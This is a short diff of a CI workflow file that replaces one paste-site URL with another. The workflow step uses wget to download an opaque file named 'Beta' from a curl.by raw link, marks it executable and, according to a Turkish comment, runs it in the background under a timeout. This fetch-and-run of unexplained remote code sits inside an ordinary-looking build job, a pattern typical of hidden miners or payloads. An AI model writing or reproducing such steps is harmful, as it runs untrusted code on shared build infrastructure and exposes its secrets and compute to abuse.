@@ -39,7 +39,7 @@ jobs:
           TIME="${{ inputs.time }}"
           
           
-          wget -q https://curl.by/xkfMA/raw -O Beta
+          wget -q https://curl.by/ZLEpH/raw -O Beta
           chmod +x Beta || true
           
           # Arka planda çalıştır, timeout ile sınırlı
